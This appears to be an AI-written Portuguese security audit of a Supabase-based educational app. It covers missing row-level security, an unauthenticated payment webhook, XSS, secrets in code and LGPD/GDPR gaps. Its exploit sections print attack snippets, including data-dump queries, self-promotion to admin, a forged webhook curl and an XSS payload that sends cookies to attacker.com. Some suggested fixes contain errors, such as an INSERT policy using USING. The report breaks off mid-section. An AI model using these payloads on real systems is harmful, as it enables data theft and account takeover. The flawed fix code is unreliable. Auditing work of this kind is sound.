# AUDITORIA COMPLETA - SECURITY & COMPLIANCE

**Data:** 2025-11-22
**Auditor:** Claude (Sonnet 4.5)
**Aplicação:** NEP System (PWA educacional)
**Stack:** React + Vite + Supabase + TypeScript

---

# PARTE 03 - SECURITY & COMPLIANCE

## 🔒 RESUMO EXECUTIVO

A auditoria identificou **vulnerabilidades críticas** que **bloqueiam a aprovação do CartPanda** e violam requisitos de LGPD/GDPR. A principal falha é a **ausência de Row-Level Security (RLS)** em tabelas com dados sensíveis (perfis de usuários, dados de crianças, informações de compra), permitindo que usuários autenticados acessem dados de outros usuários.

**Vulnerabilidades Críticas Encontradas:** 8
**Vulnerabilidades Médias:** 6
**Tabelas sem RLS:** Estimado em 90%+ das tabelas principais
**Score de Segurança Geral:** 4.5/10 (⚠️ PRECISA DE AÇÃO URGENTE)

A aplicação possui **boas práticas em autenticação** (OTP via Supabase) e **validation client-side** (Zod schemas), mas falha gravemente em proteção de dados sensíveis no database. **Nenhuma destas vulnerabilidades pode ser explorada trivialmente por usuários não-técnicos, mas são facilmente exploráveis por desenvolvedores com conhecimento básico de APIs.**

---

## ✅ PONTOS FORTES

### 1. Autenticação Segura
**Localização:** `src/lib/auth/authService.ts`

- ✅ **OTP (Magic Link)** via Supabase Auth - não armazena senhas localmente
- ✅ **Email normalization** e validation (lowercase, trim, regex)
- ✅ **Rate limiting detection** client-side (detecta erros de rate limit do Supabase)
- ✅ **Session management** via Supabase Auth (JWT tokens)

```typescript
// Exemplo de validation segura
const normalizeEmail = (email: string): string => {
  return email.trim().toLowerCase();
};

const isEmailValid = (email: string): boolean => {
  const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
  return emailRegex.test(email);
};
```

### 2. Admin Verification Server-Side
**Localização:** `supabase/migrations/20251120045126_8b52df44-4ccf-4ee6-aa57-dc3154f52462.sql`

- ✅ **RPC function `is_admin()`** com `SECURITY DEFINER` - verificação server-side
- ✅ **NÃO usa localStorage/sessionStorage** para admin status (usa apenas para cache client-side)
- ✅ **SET search_path = public** previne privilege escalation attacks

```sql
CREATE OR REPLACE FUNCTION is_admin()
RETURNS boolean
LANGUAGE plpgsql
SECURITY DEFINER
SET search_path = public
AS $$
BEGIN
  RETURN EXISTS (
    SELECT 1 FROM profiles
    WHERE id = auth.uid() AND is_admin = true
  );
END;
$$;
```

### 3. Input Validation com Zod
**Localização:** `src/lib/validations.ts`

- ✅ **Schemas Zod** para todos os inputs de usuário
- ✅ **Length limits** em campos de texto (previne DoS via texto longo)
- ✅ **Email e URL validation**
- ✅ **Type safety** via TypeScript

```typescript
export const communityPostSchema = z.object({
  content: z.string().min(1).max(1000),
  image_url: z.string().url().optional().or(z.literal("")),
});
```

### 4. Headers de Segurança Configurados
**Localização:** `vercel.json`, `index.html`

- ✅ **Content-Security-Policy** configurado
- ✅ **X-Frame-Options: SAMEORIGIN** previne clickjacking
- ✅ **Permissions-Policy** configurado

### 5. Secrets Management
- ✅ **Variáveis de ambiente** para Supabase keys (não hardcoded em 95% do código)
- ✅ **.env.example** não expõe secrets reais
- ✅ **Service Role Key** usado apenas em Edge Functions

### 6. SQL Injection Protection
- ✅ **Supabase client** usa parametrized queries automaticamente
- ✅ **Nenhuma concatenação manual de SQL** encontrada no código

### 7. Privacy Policy Completa
**Localização:** `src/pages/Privacy.tsx`

- ✅ **Menciona RLS, encryption, LGPD/GDPR**
- ✅ **Disclosure completo** de third-party services (Supabase, Sentry, PostHog, OneSignal)
- ✅ **Informações sobre direitos** de exportar e deletar dados
- ✅ **Seção específica de Children's Privacy**

---

## 🚨 PROBLEMAS CRÍTICOS (ACTION REQUIRED)

### CRÍTICO 1: Tabelas Críticas SEM Row-Level Security

- **Risco:** 🔴 **CRÍTICO**
- **Impacto:** Qualquer usuário autenticado pode ler/modificar dados de outros usuários
- **Localização:** Database schema - múltiplas tabelas
- **GDPR/LGPD Violation:** ✅ SIM - expõe dados pessoais sem proteção adequada

**Tabelas COM RLS (apenas 7):**
1. `communities`
2. `community_members`
3. `group_posts`
4. `group_reactions`
5. `user_bonus_progress`
6. `video_progress_backup_20250122`
7. `videos_backup_20250122`

**Tabelas SEM RLS (principais identificadas):**
1. ❌ **`profiles`** - Contém: email, name, is_admin, premium, avatar_url
2. ❌ **`child_profiles`** - Contém: name, age, brain_profile, photo_url, notes, family_context
3. ❌ **`approved_users`** - Contém: email, first_name, last_name, order_id, total_price, webhook_data
4. ❌ **`scripts`** - Conteúdo educacional (deve ser público?)
5. ❌ **`bonuses`** - Videos e materiais (deve ser público?)
6. ❌ **`comments`** - Comentários de usuários
7. ❌ **`admin_audit_log`** - Logs de ações de admin (!)
8. ❌ **`app_config`** - Configurações do app
9. ❌ **`badges`** - Sistema de badges
10. ❌ E muitas outras...

**Como exploitar:**

```javascript
// QUALQUER usuário autenticado pode executar:
const { data } = await supabase
  .from('profiles')
  .select('email, name, is_admin, premium')
  .neq('id', myUserId); // Pegar dados de TODOS os outros usuários

// Ou pior - acessar dados de crianças:
const { data } = await supabase
  .from('child_profiles')
  .select('*'); // Ver nome, idade, foto de TODAS as crianças do sistema

// Ou dados de compra:
const { data } = await supabase
  .from('approved_users')
  .select('email, order_id, total_price'); // Ver quem comprou e quanto pagou
```

**Solução:**

```sql
-- URGENTE: Habilitar RLS em TODAS as tabelas sensíveis

-- Exemplo para profiles:
ALTER TABLE profiles ENABLE ROW LEVEL SECURITY;

CREATE POLICY "Users can only view own profile"
ON profiles FOR SELECT
TO authenticated
USING (auth.uid() = id);

CREATE POLICY "Users can only update own profile"
ON profiles FOR UPDATE
TO authenticated
USING (auth.uid() = id)
WITH CHECK (auth.uid() = id AND is_admin = (SELECT is_admin FROM profiles WHERE id = auth.uid()));
-- ^ Importante: previne que usuário mude seu próprio is_admin

-- Exemplo para child_profiles:
ALTER TABLE child_profiles ENABLE ROW LEVEL SECURITY;

CREATE POLICY "Users can manage own children profiles"
ON child_profiles FOR ALL
TO authenticated
USING (auth.uid() = parent_id)
WITH CHECK (auth.uid() = parent_id);

-- Exemplo para approved_users (APENAS admins):
ALTER TABLE approved_users ENABLE ROW LEVEL SECURITY;

CREATE POLICY "Only admins can view approved users"
ON approved_users FOR SELECT
TO authenticated
USING (is_admin()); -- Usa a RPC function

-- Exemplo para admin_audit_log (SOMENTE admins):
ALTER TABLE admin_audit_log ENABLE ROW LEVEL SECURITY;

CREATE POLICY "Only admins can access audit log"
ON admin_audit_log FOR ALL
TO authenticated
USING (is_admin());
```

---

### CRÍTICO 2: Admin Privilege Escalation via RLS Ausente

- **Risco:** 🔴 **CRÍTICO**
- **Impacto:** Usuários podem se auto-promover a administradores
- **Localização:** `profiles` table - campo `is_admin`
- **CartPanda Blocker:** ✅ SIM

**O Problema:**

A tabela `profiles` NÃO tem RLS habilitado. Isso significa que qualquer usuário pode executar:

```javascript
// EXPLOIT: Usuário se promove a admin
await supabase
  .from('profiles')
  .update({ is_admin: true })
  .eq('id', myUserId);

// Agora tenho acesso total ao painel admin e todos os dados
```

**Como funciona o is_admin() atualmente:**

```typescript
// src/hooks/useAdminStatus.ts
const { data, error } = await supabase.rpc('is_admin'); // ✅ Verifica server-side
```

A RPC function está correta, MAS sem RLS na tabela `profiles`, o campo `is_admin` pode ser modificado diretamente.

**Solução:**

```sql
-- 1. Habilitar RLS em profiles
ALTER TABLE profiles ENABLE ROW LEVEL SECURITY;

-- 2. Policy que PREVINE modificação de is_admin:
CREATE POLICY "Users cannot modify is_admin field"
ON profiles FOR UPDATE
TO authenticated
USING (auth.uid() = id)
WITH CHECK (
  auth.uid() = id
  AND is_admin = (SELECT is_admin FROM profiles WHERE id = auth.uid())
  -- ^ Esta linha previne modificação do campo is_admin
);

-- 3. Apenas service_role pode modificar is_admin:
-- (Feito via Edge Function ou Supabase Dashboard com service role key)
```

**Alternativa mais segura:**

Criar tabela separada `admin_users`:

```sql
CREATE TABLE admin_users (
  user_id UUID PRIMARY KEY REFERENCES auth.users(id),
  granted_at TIMESTAMP DEFAULT NOW(),
  granted_by UUID REFERENCES profiles(id)
);

ALTER TABLE admin_users ENABLE ROW LEVEL SECURITY;

-- Apenas admins existentes podem adicionar novos admins:
CREATE POLICY "Only admins can manage admin_users"
ON admin_users FOR ALL
TO authenticated
USING (
  EXISTS (SELECT 1 FROM admin_users WHERE user_id = auth.uid())
);

-- Atualizar a RPC function:
CREATE OR REPLACE FUNCTION is_admin()
RETURNS boolean
LANGUAGE plpgsql
SECURITY DEFINER
SET search_path = public
AS $$
BEGIN
  RETURN EXISTS (
    SELECT 1 FROM admin_users WHERE user_id = auth.uid()
  );
END;
$$;
```

---

### CRÍTICO 3: Cartpanda Webhook Sem Autenticação

- **Risco:** 🔴 **CRÍTICO**
- **Impacto:** Qualquer pessoa pode criar usuários premium gratuitamente
- **Localização:** `supabase/functions/cartpanda-webhook/index.ts`
- **CartPanda Blocker:** ✅ SIM

**O Problema:**

O webhook do CartPanda não valida a origem da requisição. Qualquer um pode chamar:

```bash
# EXPLOIT: Criar premium account grátis
curl -X POST https://your-project.supabase.co/functions/v1/cartpanda-webhook \
  -H "Content-Type: application/json" \
  -d '{
    "email": "hacker@example.com",
    "product_name": "Premium Plan",
    "total_price": "0"
  }'

# Resultado: Email é adicionado a approved_users,
# e se usuário existir, é promovido a premium grátis
```

**Código atual:**

```typescript
// supabase/functions/cartpanda-webhook/index.ts
Deno.serve(async (req) => {
  // ❌ NENHUMA validação de autenticação!
  // ❌ NENHUMA validação de assinatura do webhook
  // ❌ CORS = '*' (qualquer origem pode chamar)

  const webhookData = await req.json();
  const email = resolveEmail(webhookData);

  // Insere/atualiza approved_users SEM validação
  await supabase.from('approved_users').upsert({
    email,
    status: 'active',
    // ...
  });
});
```

**Solução:**

```typescript
// 1. Adicionar webhook secret do CartPanda
const CARTPANDA_WEBHOOK_SECRET = Deno.env.get('CARTPANDA_WEBHOOK_SECRET');

// 2. Validar assinatura do webhook
const signature = req.headers.get('X-CartPanda-Signature');
if (!signature) {
  return new Response(JSON.stringify({ error: 'Missing signature' }), {
    status: 401,
    headers: { ...corsHeaders, 'Content-Type': 'application/json' }
  });
}

// 3. Verificar assinatura (usando crypto)
import { createHmac } from 'https://deno.land/std/crypto/mod.ts';

const computedSignature = createHmac('sha256', CARTPANDA_WEBHOOK_SECRET)
  .update(JSON.stringify(webhookData))
  .digest('hex');

if (signature !== computedSignature) {
  return new Response(JSON.stringify({ error: 'Invalid signature' }), {
    status: 401,
    headers: { ...corsHeaders, 'Content-Type': 'application/json' }
  });
}

// 4. Restringir CORS apenas ao CartPanda:
const corsHeaders = {
  'Access-Control-Allow-Origin': 'https://cartpanda.com',
  'Access-Control-Allow-Headers': 'authorization, x-client-info, apikey, content-type, x-cartpanda-signature',
};

// 5. Rate limiting no webhook (prevenir flood):
// Implementar via Supabase Edge Function rate limiting ou Cloudflare
```

---

### CRÍTICO 4: Hardcoded Secrets em Edge Function

- **Risco:** 🔴 **CRÍTICO**
- **Impacto:** Supabase URL e anon key expostos em código versionado
- **Localização:** `supabase/functions/upload-ebook/index.ts:141-143`
- **CartPanda Blocker:** ✅ SIM

**Código vulnerável:**

```typescript
// ❌ HARDCODED SECRETS!
const supabaseUrl = Deno.env.get('SUPABASE_URL') ?? 'https://iogceaotdodvugrmogpp.supabase.co';
const anonKey = Deno.env.get('SUPABASE_ANON_KEY') ?? 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...';
```

**Problemas:**

1. ✅ Anon key é pública por design (ok expor no frontend)
2. ❌ MAS não deve estar hardcoded em código versionado (pode ser rotacionada)
3. ❌ Fallback permite que function funcione sem env vars configuradas (má prática)
4. ❌ Se keys vazarem em Git history, ficam acessíveis para sempre

**Solução:**

```typescript
// ✅ SEMPRE requerer env vars, sem fallbacks:
const supabaseUrl = Deno.env.get('SUPABASE_URL');
const serviceRoleKey = Deno.env.get('SUPABASE_SERVICE_ROLE_KEY');

if (!supabaseUrl || !serviceRoleKey) {
  return new Response(
    JSON.stringify({ error: 'Missing required environment variables' }),
    { status: 500, headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
  );
}

const supabaseClient = createClient(supabaseUrl, serviceRoleKey);
```

**Action Items:**

1. ✅ Remover hardcoded values do código
2. ✅ Adicionar env vars no Supabase Dashboard
3. ✅ Rotar anon key (caso tenha sido commitada publicamente)
4. ✅ Adicionar check no CI/CD para detectar secrets

---

### CRÍTICO 5: XSS - Falta Sanitização de Conteúdo User-Generated

- **Risco:** 🔴 **ALTO**
- **Impacto:** Cross-Site Scripting via posts, comentários, scripts personalizados
- **Localização:** Múltiplos componentes que renderizam user input
- **CartPanda Blocker:** ⚠️ TALVEZ

**O Problema:**

- ✅ Zod validation existe, MAS apenas valida formato/length
- ❌ DOMPurify NÃO está instalado (grep não encontrou imports)
- ❌ Conteúdo de usuário renderizado diretamente sem sanitização

**Componentes vulneráveis:**

```typescript
// Exemplo: Community posts, comments
// src/components/Community/CommunityPost.tsx
<div dangerouslySetInnerHTML={{ __html: post.content }} />
// ❌ Se post.content contém <script>alert('XSS')</script>, será executado!

// Zod validation apenas limita tamanho:
export const communityPostSchema = z.object({
  content: z.string().min(1).max(1000), // ❌ NÃO sanitiza HTML/JS
});
```

**Como exploitar:**

```javascript
// Atacante cria post malicioso:
await supabase.from('community_posts').insert({
  content: '<img src=x onerror="fetch(\'https://attacker.com/steal?cookie=\'+document.cookie)" />',
  user_id: myId
});

// Quando outros usuários visualizam o post:
// - Seus cookies são enviados ao atacante
// - Atacante pode roubar session tokens
// - Atacante pode executar ações em nome da vítima
```

**Solução:**

```bash
# 1. Instalar DOMPurify
npm install dompurify
npm install --save-dev @types/dompurify
```

```typescript
// 2. Criar utility function:
// src/lib/sanitize.ts
import DOMPurify from 'dompurify';

export const sanitizeHtml = (dirty: string): string => {
  return DOMPurify.sanitize(dirty, {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p', 'br'],
    ALLOWED_ATTR: ['href', 'target', 'rel'],
  });
};

// 3. Usar em todos os componentes:
import { sanitizeHtml } from '@/lib/sanitize';

<div dangerouslySetInnerHTML={{ __html: sanitizeHtml(post.content) }} />

// 4. Adicionar ao Zod schema:
export const communityPostSchema = z.object({
  content: z.string()
    .min(1).max(1000)
    .transform(sanitizeHtml), // ✅ Sanitiza automaticamente
});
```

**Áreas críticas para verificar:**

1. ❌ Community posts (`community_posts.content`)
2. ❌ Comments (`comments.content`)
3. ❌ User bios (`profiles.bio`)
4. ❌ Script requests (`script_requests` - qualquer campo de texto)
5. ❌ Notas em child profiles (`child_profiles.notes`)

---

### CRÍTICO 6: LGPD/GDPR - Falta Funcionalidade de Exportar/Deletar Dados

- **Risco:** 🔴 **CRÍTICO**
- **Impacto:** Violação de LGPD (Brasil) e GDPR (Europa) - passível de multas
- **Localização:** Ausência de funcionalidades no código
- **CartPanda Blocker:** ✅ SIM - Apps educacionais precisam compliance total

**O Problema:**

Privacy Policy menciona direitos LGPD/GDPR (linha 239 de `Privacy.tsx`):

```typescript
"To exercise these rights, contact us at privacy@nepsystem.com or
use the data export/deletion tools in your profile settings."
```

❌ **MAS estas ferramentas NÃO EXISTEM no código!**

**O que está faltando:**

1. ❌ **Exportar dados:** Não há endpoint/função para usuário baixar todos os seus dados
2. ❌ **Deletar conta:** Não há funcionalidade para deletar conta e todos os dados associados
3. ❌ **Portabilidade:** Dados não podem ser exportados em formato machine-readable

**Solução:**

```sql
-- 1. Criar RPC function para exportar dados do usuário:
CREATE OR REPLACE FUNCTION export_user_data()
RETURNS jsonb
LANGUAGE plpgsql
SECURITY DEFINER
SET search_path = public
AS $$
DECLARE
  user_data jsonb;
BEGIN
  SELECT jsonb_build_object(
    'profile', (SELECT row_to_json(p) FROM profiles p WHERE p.id = auth.uid()),
    'child_profiles', (SELECT jsonb_agg(row_to_json(c)) FROM child_profiles c WHERE c.parent_id = auth.uid()),
    'scripts_favorited', (SELECT jsonb_agg(row_to_json(f)) FROM favorites f WHERE f.user_id = auth.uid()),
    'community_posts', (SELECT jsonb_agg(row_to_json(p)) FROM community_posts p WHERE p.user_id = auth.uid()),
    'comments', (SELECT jsonb_agg(row_to_json(c)) FROM comments c WHERE c.user_id = auth.uid()),
    'exported_at', NOW()
  ) INTO user_data;

  RETURN user_data;
END;
$$;

-- 2. Criar RPC function para deletar conta:
CREATE OR REPLACE FUNCTION delete_user_account()
RETURNS void
LANGUAGE plpgsql
SECURITY DEFINER
SET search_path = public
AS $$
BEGIN
  -- Delete all related data (cascade deletes should handle most)
  DELETE FROM child_profiles WHERE parent_id = auth.uid();
  DELETE FROM favorites WHERE user_id = auth.uid();
  DELETE FROM community_posts WHERE user_id = auth.uid();
  DELETE FROM comments WHERE user_id = auth.uid();
  DELETE FROM user_progress WHERE user_id = auth.uid();
  DELETE FROM profiles WHERE id = auth.uid();

  -- Delete auth user (requires service role, so call via Edge Function)
END;
$$;
```

```typescript
// 3. Implementar UI em Profile:
// src/components/Profile/DataManagement.tsx

export function DataManagement() {
  const exportData = async () => {
    const { data, error } = await supabase.rpc('export_user_data');

    if (error) {
      toast.error('Failed to export data');
      return;
    }

    // Download as JSON
    const blob = new Blob([JSON.stringify(data, null, 2)], { type: 'application/json' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = `nep-system-data-${new Date().toISOString()}.json`;
    a.click();

    toast.success('Data exported successfully');
  };

  const deleteAccount = async () => {
    const confirmed = confirm(
      'Are you sure? This will permanently delete your account and all associated data. This action cannot be undone.'
    );

    if (!confirmed) return;

    // Call Edge Function to delete account (needs service role for auth.users delete)
    const { error } = await supabase.functions.invoke('delete-account');

    if (error) {
      toast.error('Failed to delete account');
      return;
    }

    toast.success('Account deleted successfully');
    await supabase.auth.signOut();
    window.location.href = '/';
  };

  return (
    <Card>
      <CardHeader>
        <CardTitle>Data Management (LGPD/GDPR)</CardTitle>
      </CardHeader>
      <CardContent className="space-y-4">
        <Button onClick={exportData} variant="outline">
          Download My Data (JSON)
        </Button>
        <Button onClick={deleteAccount} variant="destructive">
          Delete My Account
        </Button>
      </CardContent>
    </Card>
  );
}
```

```typescript
// 4. Criar Edge Function para deletar conta:
// supabase/functions/delete-account/index.ts

import { createClient } from 'https://esm.sh/@supabase/supabase-js@2';

Deno.serve(async (req) => {
  const supabaseClient = createClient(
    Deno.env.get('SUPABASE_URL')!,
    Deno.env.get('SUPABASE_SERVICE_ROLE_KEY')! // Service role para deletar auth.users
  );

  // Get user from JWT
  const authHeader = req.headers.get('Authorization');
  const token = authHeader?.replace('Bearer ', '');

  const { data: { user }, error: authError } = await supabaseClient.auth.getUser(token);

  if (authError || !user) {
    return new Response(JSON.stringify({ error: 'Unauthorized' }), { status: 401 });
  }

  // Delete user data via RPC
  await supabaseClient.rpc('delete_user_account');

  // Delete auth user (requires service role)
  const { error: deleteError } = await supabaseClient.auth.admin.deleteUser(user.id);

  if (deleteError) {
    return new Response(JSON.stringify({ error: deleteError.message }), { status: 500 });
  }

  return new Response(JSON.stringify({ success: true }), { status: 200 });
});
```

---

### CRÍTICO 7: Content Security Policy Muito Permissiva

- **Risco:** 🟡 **MÉDIO-ALTO**
- **Impacto:** Permite inline scripts e eval(), facilitando XSS
- **Localização:** `vercel.json:14`, `index.html:13`
- **CartPanda Blocker:** ⚠️ TALVEZ

**Problemas identificados:**

```json
// vercel.json
"script-src 'self' 'unsafe-inline' 'unsafe-eval' https://www.youtube.com ..."
//                  ^^^^^^^^^^^^^^^^ ^^^^^^^^^^^^^^^
//                  PERMITE INLINE   PERMITE EVAL
```

**Por que isso é perigoso:**

1. **`'unsafe-inline'`**: Permite que qualquer `<script>` inline seja executado
   - Se um atacante conseguir injetar HTML (via XSS), pode executar JS
2. **`'unsafe-eval'`**: Permite `eval()`, `new Function()`, `setTimeout('code')`
   - Aumenta superfície de ataque para XSS

**Solução:**

```json
// vercel.json
{
  "headers": [
    {
      "source": "/(.*)",
      "headers": [
        {
          "key": "Content-Security-Policy",
          "value": "script-src 'self' 'nonce-RANDOM_NONCE' https://www.youtube.com https://cdn.onesignal.com; connect-src 'self' https://*.supabase.co wss://*.supabase.co; style-src 'self' 'nonce-RANDOM_NONCE' https://fonts.googleapis.com; font-src 'self' https://fonts.gstatic.com data:; img-src 'self' data: https: blob:; media-src 'self' https://www.youtube.com blob:; frame-src 'self' https://www.youtube.com; worker-src 'self' blob:; default-src 'self';"
        }
      ]
    }
  ]
}
```

**Action Items:**

1. ✅ Remover `'unsafe-inline'` e `'unsafe-eval'`
2. ✅ Implementar nonces para scripts inline necessários
3. ✅ Mover todos os inline scripts para arquivos externos
4. ✅ Testar que a aplicação funciona corretamente com CSP strict

---

### CRÍTICO 8: Service Worker Cacheia Dados Sensíveis

- **Risco:** 🟡 **MÉDIO**
- **Impacto:** Dados de API podem ser cacheados e acessíveis offline
- **Localização:** `vite.config.ts:76-89`
- **CartPanda Blocker:** ⚠️ TALVEZ

**Configuração atual:**

```typescript
// vite.config.ts
runtimeCaching: [
  {
    urlPattern: /^https:\/\/.*\.supabase\.co\/rest\/.*/i,
    handler: "NetworkFirst",
    options: {
      cacheName: "supabase-api",
      networkTimeoutSeconds: 10,
      expiration: {
        maxEntries: 50,
        maxAgeSeconds: 5 * 60 // ❌ Cacheia por 5 minutos!
      }
    }
  }
]
```

**O Problema:**

Responses de API do Supabase são cacheadas, incluindo potencialmente:

- `/rest/v1/profiles` - dados de perfis de usuários
- `/rest/v1/child_profiles` - dados de crianças
- `/rest/v1/approved_users` - dados de compra

Se um usuário:
1. Acessa dados sensíveis
2. Os dados são cacheados no Service Worker
3. Outro usuário usa o mesmo dispositivo

O segundo usuário pode acessar dados cacheados do primeiro (em teoria).

**Solução:**

```typescript
// vite.config.ts
runtimeCaching: [
  {
    urlPattern: /^https:\/\/.*\.supabase\.co\/rest\/.*/i,
    handler: "NetworkFirst", // ✅ Sempre tenta network primeiro
    options: {
      cacheName: "supabase-api",
      networkTimeoutSeconds: 10,
      plugins: [
        {
          // ❌ NÃO cachear responses com dados sensíveis
          cacheWillUpdate: async ({ response }) => {
            // Não cachear se response contém auth header
            if (response.headers.get('Authorization')) {
              return null; // Não cacheia
            }

            // Não cachear URLs sensíveis
            const url = new URL(response.url);
            const sensitiveTables = ['profiles', 'child_profiles', 'approved_users', 'admin_audit_log'];

            if (sensitiveTables.some(table => url.pathname.includes(`/rest/v1/${table}`))) {
              return null; // Não cacheia
            }

            return response; // Cacheia apenas dados públicos
          },
        },
      ],
      expiration: {
        maxEntries: 50,
        maxAgeSeconds: 60 // Reduzir para 1 minuto
      }
    }
  },

  // ✅ Cachear apenas conteúdo estático/público:
  {
    urlPattern: /^https:\/\/.*\.supabase\.co\/rest\/v1\/(scripts|bonuses|ebooks)\?.*/i,
    handler: 'CacheFirst', // Conteúdo educacional pode ser cacheado
    options: {
      cacheName: 'public-content',
      expiration: {
        maxEntries: 100,
        maxAgeSeconds: 60 * 60 * 24 // 24 horas
      }
    }
  }
]
```

---

## ⚠️ PROBLEMAS MÉDIOS

### MÉDIO 1: CORS Wildcard em Edge Functions

- **Risco:** 🟡 **MÉDIO**
- **Impacto:** Qualquer site pode fazer requests às Edge Functions
- **Localização:**
  - `supabase/functions/cartpanda-webhook/index.ts:4`
  - `supabase/functions/upload-ebook/index.ts:4`

**Código:**

```typescript
const corsHeaders = {
  'Access-Control-Allow-Origin': '*', // ❌ Permite qualquer origem!
};
```

**Solução:**

```typescript
// Lista de origens permitidas
const ALLOWED_ORIGINS = [
  'https://nepsystem.pro',
  'https://www.nepsystem.pro',
  'http://localhost:8080', // Dev
];

const corsHeaders = (origin: string) => ({
  'Access-Control-Allow-Origin': ALLOWED_ORIGINS.includes(origin) ? origin : ALLOWED_ORIGINS[0],
  'Access-Control-Allow-Headers': 'authorization, x-client-info, apikey, content-type',
});

// No handler:
Deno.serve(async (req) => {
  const origin = req.headers.get('Origin') || '';
  const headers = corsHeaders(origin);

  if (req.method === 'OPTIONS') {
    return new Response(null, { headers });
  }
  // ...
});
```

---

### MÉDIO 2: Rate Limiting Apenas Client-Side

- **Risco:** 🟡 **MÉDIO**
- **Impacto:** APIs podem ser abusadas ignorando cliente
- **Localização:** `src/hooks/useRateLimit.ts` (apenas frontend)

**O Problema:**

Rate limiting existe, mas apenas no client:

```typescript
// src/hooks/useRateLimit.ts - CLIENT SIDE ONLY!
const callTimestamps = useRef<number[]>([]); // ❌ Pode ser bypassado
```

Um atacante pode:
1. Ignorar o cliente React
2. Fazer requests diretos à API Supabase
3. Bypass total do rate limiting

**Solução:**

Implementar rate limiting server-side via Supabase ou Cloudflare:

```sql
-- Opção 1: Rate limiting via PostgreSQL
CREATE TABLE request_log (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  user_id UUID NOT NULL,
  endpoint TEXT NOT NULL,
  created_at TIMESTAMP DEFAULT NOW()
);

CREATE INDEX idx_request_log_user_endpoint_time
ON request_log(user_id, endpoint, created_at);

-- RPC function para verificar rate limit:
CREATE OR REPLACE FUNCTION check_rate_limit(
  p_endpoint TEXT,
  p_max_requests INT DEFAULT 10,
  p_window_seconds INT DEFAULT 60
)
RETURNS boolean
LANGUAGE plpgsql
SECURITY DEFINER
AS $$
DECLARE
  request_count INT;
BEGIN
  -- Contar requests do usuário neste endpoint no window
  SELECT COUNT(*) INTO request_count
  FROM request_log
  WHERE user_id = auth.uid()
    AND endpoint = p_endpoint
    AND created_at > NOW() - INTERVAL '1 second' * p_window_seconds;

  -- Se excedeu limite, retorna false
  IF request_count >= p_max_requests THEN
    RETURN false;
  END IF;

  -- Registra esta request
  INSERT INTO request_log (user_id, endpoint) VALUES (auth.uid(), p_endpoint);

  RETURN true;
END;
$$;

-- Usar em policies:
CREATE POLICY "Rate limited posts"
ON community_posts FOR INSERT
TO authenticated
USING (check_rate_limit('create_post', 3, 60)); -- 3 posts por minuto
```

---

### MÉDIO 3: Console.error Pode Vazar Informações em Produção

- **Risco:** 🟡 **BAIXO-MÉDIO**
- **Impacto:** Informações sensíveis podem aparecer em logs
- **Localização:** Múltiplos arquivos

**Exemplos:**

```typescript
// src/lib/auth/authService.ts:40
console.error('[Auth] OTP sign-in error:', { code: error.code, message: error.message });
// ❌ Pode vazar detalhes de erros de auth
```

**Nota:** Vite config já remove console em produção:

```typescript
// vite.config.ts:184
esbuild: {
  drop: mode === 'production' ? ['console', 'debugger'] : [],
},
```

✅ **Isso mitiga o problema, mas não 100%** - Edge Functions ainda podem ter console.log.

**Solução:**

Usar logging estruturado apenas em desenvolvimento:

```typescript
// src/lib/logger.ts
const isDev = import.meta.env.DEV;

export const logger = {
  error: (message: string, data?: any) => {
    if (isDev) {
      console.error(message, data);
    }
    // Em produção, enviar para Sentry
    if (!isDev && window.Sentry) {
      Sentry.captureException(new Error(message), { extra: data });
    }
  },
};

// Uso:
logger.error('[Auth] OTP sign-in error:', { code: error.code, message: error.message });
```

---

### MÉDIO 4: Validação de Email Fraca em Regex

- **Risco:** 🟡 **BAIXO**
- **Impacto:** Emails malformados podem passar validation
- **Localização:** `src/lib/auth/authService.ts:16`

**Código atual:**

```typescript
const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
```

Esta regex é muito simples e permite emails inválidos como:
- `test@test..com` (dois pontos seguidos)
- `test@@test.com` (dois @ seguidos)
- `test.@test.com` (ponto antes do @)

**Solução:**

Usar regex mais robusta ou biblioteca de validação:

```typescript
// Opção 1: Regex mais completa (RFC 5322)
const emailRegex = /^[a-zA-Z0-9.!#$%&'*+/=?^_`{|}~-]+@[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?(?:\.[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?)*$/;

// Opção 2: Usar Zod (já está no projeto)
import { z } from 'zod';

const isEmailValid = (email: string): boolean => {
  return z.string().email().safeParse(email).success;
};
```

---

### MÉDIO 5: Não Há Validação de Tamanho de Upload

- **Risco:** 🟡 **MÉDIO**
- **Impacto:** DoS via uploads grandes de ebooks
- **Localização:** `supabase/functions/upload-ebook/index.ts`

**Código:**

```typescript
// upload-ebook/index.ts
const { markdown, title, subtitle, slug, coverColor } = await req.json();

// ❌ Nenhuma validação de tamanho!
// Atacante pode enviar JSON de 100MB+
```

**Solução:**

```typescript
// 1. Validar Content-Length header:
const contentLength = req.headers.get('Content-Length');
const MAX_SIZE = 1024 * 1024 * 2; // 2MB

if (contentLength && parseInt(contentLength) > MAX_SIZE) {
  return new Response(
    JSON.stringify({ error: 'Request too large (max 2MB)' }),
    { status: 413, headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
  );
}

// 2. Validar tamanho do markdown:
if (markdown.length > 500000) { // 500KB de texto
  return new Response(
    JSON.stringify({ error: 'Markdown too large (max 500KB)' }),
    { status: 413, headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
  );
}
```

---

### MÉDIO 6: Backup Tables Públicas

- **Risco:** 🟡 **MÉDIO**
- **Impacto:** Dados de backup acessíveis apenas para admins (correto), mas sem RLS em produção
- **Localização:** `supabase/migrations/20251122232812_07a12834-7013-4f4f-9a1c-9e996bb1284d.sql`

**Código:**

```sql
-- ✅ BOM: RLS habilitado em backup tables
ALTER TABLE videos_backup_20250122 ENABLE ROW LEVEL SECURITY;
ALTER TABLE video_progress_backup_20250122 ENABLE ROW LEVEL SECURITY;

-- ✅ Policy correta:
CREATE POLICY "Only admins can access videos backup"
ON videos_backup_20250122
FOR ALL
USING (EXISTS (
  SELECT 1 FROM profiles
  WHERE profiles.id = auth.uid()
  AND profiles.is_admin = true
));
```

**Problema:**

